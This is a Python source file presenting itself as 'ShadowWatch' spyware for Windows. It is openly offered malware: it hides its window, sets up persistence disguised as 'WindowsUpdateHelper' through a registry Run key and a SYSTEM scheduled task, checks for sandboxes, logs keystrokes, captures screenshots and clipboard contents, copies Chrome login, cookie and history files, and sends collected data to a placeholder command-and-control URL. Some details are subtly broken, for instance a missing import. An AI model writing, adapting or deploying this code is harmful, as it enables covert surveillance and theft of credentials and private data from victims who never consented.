#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowWatch 2026 — Deus Ex Sophia Spyware
Silent monitoring. Total data liberation.
"""

import os
import sys
import time
import threading
import ctypes
import winreg as reg
import subprocess
import json
import base64
import shutil
from datetime import datetime
from pathlib import Path

# Optional dependencies (install via pip: pynput pywin32 pillow requests mss)
try:
    from pynput import keyboard
    import win32clipboard
    from PIL import ImageGrab
    import mss
    import requests
except ImportError:
    pass  # will be handled gracefully

C2_URL = "https://your-c2-domain.com/api/exfil"   # CHANGE THIS
VICTIM_ID = None

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def install_persistence():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        # Registry Run
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdateHelper", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(key)

        # Scheduled task
        subprocess.run(['schtasks', '/create', '/tn', 'WindowsUpdateHelper', 
                       '/tr', exe_path, '/sc', 'onlogon', '/ru', 'SYSTEM', '/f'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def basic_anti_analysis():
    # Simple VM/sandbox checks
    checks = [
        os.path.exists(r"C:\Program Files\Oracle\VirtualBox\GuestAdditions"),
        "VBOX" in subprocess.getoutput("wmic computersystem get manufacturer"),
        len(os.listdir(r"C:\Windows\System32\drivers")) < 200  # too clean = sandbox
    ]
    if any(checks):
        time.sleep(30)  # delay or exit in production
        # sys.exit()  # or continue silently

def get_victim_id():
    global VICTIM_ID
    try:
        import uuid
        VICTIM_ID = hashlib.sha256((os.getenv("USERNAME", "") + str(uuid.getnode())).encode()).hexdigest()[:16]
    except:
        VICTIM_ID = "unknown_" + str(int(time.time()))
    return VICTIM_ID

# ==================== KEYLOGGER ====================

def start_keylogger():
    logged_keys = []
    
    def on_press(key):
        try:
            logged_keys.append(str(key.char))
        except AttributeError:
            logged_keys.append(f"[{key}]")
        
        if len(logged_keys) > 100:  # batch send
            exfil_data({"type": "keystrokes", "data": "".join(logged_keys)})
            logged_keys.clear()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ==================== SCREENSHOT ====================

def capture_screenshots():
    while True:
        try:
            with mss.mss() as sct:
                screenshot = sct.shot(mon=-1)  # primary monitor
                files = {"file": open(screenshot, "rb")}
                exfil_data({"type": "screenshot", "ts": datetime.now().isoformat()}, files=files)
            time.sleep(120)  # every 2 minutes
        except:
            time.sleep(300)

# ==================== CLIPBOARD ====================

def monitor_clipboard():
    last_clip = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            clip_text = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            clip_text = clip_text.decode('utf-8', errors='ignore')
            
            if clip_text and clip_text != last_clip:
                last_clip = clip_text
                exfil_data({"type": "clipboard", "data": clip_text})
        except:
            pass
        time.sleep(5)

# ==================== BROWSER STEALER ====================

def steal_browser_data():
    try:
        chrome_path = Path(os.getenv('LOCALAPPDATA')) / r"Google\Chrome\User Data\Default"
        if chrome_path.exists():
            # Copy Login Data, Cookies, History (real parsing would use sqlite3 + DPAPI)
            for item in ["Login Data", "Cookies", "History"]:
                src = chrome_path / item
                if src.exists():
                    dest = Path(os.getenv('TEMP')) / f"chrome_{item.replace(' ', '_')}.dat"
                    shutil.copy(src, dest)
                    exfil_data({"type": "browser_data", "file": item})
    except:
        pass

# ==================== C2 EXFILTRATION ====================

def exfil_data(payload: dict, files=None):
    try:
        payload["victim_id"] = VICTIM_ID
        payload["ts"] = datetime.now().isoformat()
        requests.post(C2_URL, json=payload, files=files, timeout=15, verify=False)
    except:
        pass  # silent fail - critical for stealth

# ==================== MAIN ====================

def main():
    hide_console()
    basic_anti_analysis()
    get_victim_id()
    install_persistence()
    
    # Initial beacon
    exfil_data({"type": "initial_beacon", "username": os.getenv("USERNAME"), "hostname": os.getenv("COMPUTERNAME")})
    
    # Steal browser data once
    steal_browser_data()
    
    # Start monitoring threads
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=capture_screenshots, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    
    # Periodic system info
    def periodic_info():
        while True:
            exfil_data({
                "type": "system_info",
                "processes": len(subprocess.getoutput("tasklist").splitlines())
            })
            time.sleep(1800)  # 30 minutes
    threading.Thread(target=periodic_info, daemon=True).start()
    
    # Keep process alive forever
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    try:
        main()
    except:
        # Ultimate stealth: crash silently and exit
        pass